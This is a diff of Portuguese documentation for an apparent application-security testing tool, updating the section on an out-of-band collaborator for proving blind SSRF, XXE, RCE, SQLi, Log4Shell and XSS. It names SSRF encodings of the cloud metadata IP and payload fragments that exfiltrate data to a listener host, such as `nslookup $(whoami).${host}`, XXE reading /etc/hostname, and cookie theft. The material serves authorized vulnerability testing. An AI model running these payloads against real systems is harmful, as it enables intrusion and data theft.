@@ -332,17 +332,25 @@ Acesse a aba **AppSec** na barra de navegação superior para abrir a central t�
   3. Utilize a **Matriz de Evasão de Filtros**: o IP link-local `169.254.169.254` é convertido automaticamente em Decimal DWORD (`2852039166`), Hexadecimal (`0xa9fea9fe`), Octal (`0251.0376.0251.0376`), IPv6-mapped e DNS Rebinding via `nip.io`.
   4. Copie o comando cURL pronto com cabeçalhos exigidos (`Metadata-Flavor: Google`, `X-aws-ec2-metadata-token`).
 
-#### 23. Out-of-Band (OOB) Interaction Studio
-* **Objetivo:** Central Collaborator para comprovação de vulnerabilidades cegas (Blind SSRF, Blind XXE, Blind RCE e Blind SQLi).
+#### 23. OOB (Out-of-Band) Collaborator
+* **Objetivo:** Central Collaborator para comprovação empírica de vulnerabilidades cegas (Blind SSRF, Blind XXE, Blind RCE via DNS, Blind SQLi, Log4Shell e Blind XSS) através de testes de interação de rede externa nos protocolos DNS, HTTP, HTTPS e LDAP.
 * **Passo a Passo:**
-  1. O sistema gera um domínio de escuta dinâmico exclusivo (ex: `bb-x7k9p2.bounty-oob.net`).
-  2. Selecione o vetor de ataque desejado na biblioteca de payloads formatados:
-     - **Blind SSRF:** Invocação de webhook com callback OOB;
-     - **Blind XXE:** DTD externo exfiltrando `/etc/passwd` via HTTP;
-     - **Blind RCE:** Exfiltração de dados via subdomínio DNS (`ping $(whoami).${oob}`);
-     - **OOB-SQLi:** Triggers de resolução de rede para MSSQL (`master..xp_dirtree`) e Oracle.
-  3. Monitore os callbacks recebidos no painel em tempo real.
-  4. Use o **Decodificador Integrado** para converter automaticamente dados exfiltrados em hexadecimal ou base64.
+  1. O sistema gera automaticamente um domínio de escuta exclusivo com token randômico (ex: `recon-x7k9p2.oob.bugsentinel.internal`).
+  2. Ajuste o prefixo/tag de correlação (ex: `ssrf-api`, `auth-flow`) para identificar exatamente qual teste disparou o callback.
+  3. Escolha o servidor base (servidor interno padrão, `interact.sh`, `burpcollaborator.net` ou FQDN próprio).
+  4. Selecione a técnica na biblioteca de payloads formatados:
+     - **DNS Resolution Testing:** Consultas `nslookup`, `dig +short` e exfiltração de variáveis de ambiente por subdomínio DNS (`nslookup $(whoami).${host}`);
+     - **HTTP / HTTPS Callbacks & Webhooks:** Invocação de webhook com callback OOB, testes de injeção em cabeçalhos de proxy (`X-Forwarded-For`, `X-Real-IP`, `Referer`) e extração de metadados AWS IMDSv1;
+     - **Blind XXE:** Definição de entidade de parâmetro DTD externo (`eval.dtd`) exfiltrando `/etc/hostname` via HTTP;
+     - **Blind RCE (Command Injection):** Payloads para Linux e Windows com exfiltração de dados concatenados;
+     - **Blind SQLi (OOB-SQLi):** Comandos nativos de banco de dados que disparam tráfego de rede (`master..xp_dirtree`, `UTL_INADDR.get_host_address`, `COPY ... PROGRAM`);
+     - **Log4Shell & JNDI:** Expressões JNDI LDAP na porta 1389 e DNS exfiltration;
+     - **Blind XSS:** Payloads de imagem e script exfiltrando `document.cookie`.
+  5. Acompanhe o feed de interações recebidas em tempo real com protocolo, IP de origem, timestamp UTC e status de captura (Ativo / Pausado).
+  6. Clique em **Inspecionar** para examinar detalhes completos da requisição (Reverse DNS, GeoIP, cabeçalhos HTTP recebidos, parâmetros de query e corpo POST).
+  7. Clique em **Evidência** para copiar a prova de conceito estruturada em Markdown para anexar ao seu relatório de vulnerabilidade.
+  8. Exporte os logs em formato **JSON** ou **CSV** para arquivamento ou compliance.
+  9. Use o **Decodificador Integrado de Dados Exfiltrados (OOB Data Workbench)** para converter instantaneamente subdomínios em formato hexadecimal (ex: `726f6f74` ➔ `root`), strings Base64 e URL Decoded.
 
 #### 24. Subdomain Takeover Analyzer
 * **Objetivo:** Auditar registros CNAME órfãos para detectar sequestro de subdomínios em provedores de nuvem.
